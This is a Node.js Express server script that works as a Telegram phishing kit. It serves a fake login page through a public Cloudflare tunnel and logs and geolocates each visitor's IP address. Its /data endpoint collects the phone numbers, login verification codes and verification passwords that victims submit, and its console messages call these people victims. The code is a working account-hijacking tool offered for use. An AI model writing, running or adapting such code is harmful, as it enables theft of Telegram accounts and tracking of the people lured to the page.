const colors = require("colors");
const express = require("express");
const fs = require('fs');
const path = require("path");
const qrcode = require("qrcode-terminal");
const { spawn } = require('child_process');
const cors = require('cors');
const app = express();
const http = require('http');
const port = "4040";
const server = "http://localhost:4040";
console.log("Hi, user. welcome to script main.js".white.bold);
const host = "127.0.0.1"
const logs = [];
app.use(cors());
app.use(express.json());

app.use(express.static('server.tg'));

app.get(('/bot'), (req, res)  => {
const userIp = req.headers['x-forwarded-for'] || req.ip;
console.log('[!] New IP '.white.bold, userIp.green.bold);
http.get(`http://ip-api.com/json/${userIp}`, (resp) => {
let data = '';

resp.on('data', (chunk) => {
data += chunk;
});
resp.on('end', () => {
const parsedData = JSON.parse(data);
const formattedData = JSON.stringify(parsedData, null, 2);
console.log(formattedData.yellow.bold);
})
})

res.sendFile(__dirname + '/server.tg/index.html');
});

app.get('/tunnel-url', (req, res) => {
  res.json({ url: tunnelUrl });
});

app.post('/data', (req, res) => {
const logData = {
number: req.body.number,
telegram: req.body.telegram,
code: req.body.code
};
logs.push(logData);
console.log('\n[!] Telegram Number'.white.bold,`${logData.number}`.green.bold);
if (!logData.code || logData.code.trim() === '') {
    console.log(' - Start the script for the victim to receive the verification code.'.black.bold);
    console.log('[!] Telegram Code'.white.bold, 'Loading...'.black.bold);
} else {
    console.log('[!] Telegram Code'.white.bold, `${logData.code}`.blue.bold);
}

if (!logData.telegram || logData.telegram.trim() === '') {
    console.log('[!] Telegram Verify'.white.bold, 'Loading...'.black.bold);
} else {
    console.log('[!] Telegram Verify'.white.bold, `${logData.telegram}`.blue.bold);
}


})

app.get('/server', (req, res) => {
res.sendFile(path.join(__dirname, 'server.tg', 'index.html'));
});

qrcode.generate(server, {small: true}, function(qrcode) {
console.log(qrcode);
});


app.get('/ico', (req, res) => {
res.sendFile(path.join(__dirname, 'server.tg', 'favicon.ico'))
});

app.listen(port, () => {
  console.log(`[+] Server running on`.white.bold, ` http://localhost:${port}`.yellow.bold);

  const cloudflared = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${port}`]);

  const parseUrl = (data) => {
    const text = data.toString();
    const match = text.match(/https:\/\/.*trycloudflare\.com/);
    if (match) {
      tunnelUrl = match[0];
      console.log(`[+] Cloudflare Tunnel:`.white.bold,`${tunnelUrl}`.green.bold);
    }
  };

  cloudflared.stdout.on('data', parseUrl);
  cloudflared.stderr.on('data', parseUrl);
});
